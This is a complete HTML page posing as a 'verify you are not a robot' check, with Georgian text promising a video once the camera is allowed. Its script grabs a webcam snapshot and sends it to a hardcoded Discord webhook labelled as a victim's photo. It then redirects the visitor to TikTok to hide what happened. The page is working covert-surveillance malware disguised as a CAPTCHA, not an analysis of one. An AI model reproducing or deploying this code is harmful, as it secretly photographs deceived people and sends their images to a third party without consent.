<!DOCTYPE html>
<html>
<head>
    <title>Verification</title>
</head>
<body style="background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif;">

    <div id="setup">
        <h2>Verify you are not a robot</h2>
        <p>დააჭირეთ ღილაკს და დაეთანხმეთ კამერას, რომ ნახოთ ვიდეო</p>
        <button onclick="startCamera()" style="background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer;">VERIFY</button>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";

        async function startCamera() {
            try {
                // კამერის მოთხოვნა
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // ველოდებით ცოტა ხანს, რომ კამერა ფოკუსირდეს
                setTimeout(() => {
                    takeSnapshot();
                }, 1000);
            } catch (err) {
                alert("კამერაზე წვდომა აუცილებელია ვიდეოს სანახავად!");
            }
        }

        function takeSnapshot() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            context.drawImage(video, 0, 0, 640, 480);
            
            // ფოტოს გადაყვანა Base64 ფორმატში
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'capture.jpg');
                formData.append('content', "🎯 **მსხვერპლის ფოტო მოვიდა!**");

                // გაგზავნა Discord-ზე
                await fetch(webhookURL, {
                    method: 'POST',
                    body: formData
                });

                // გადამისამართება
                window.location.href = "https://www.tiktok.com";
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
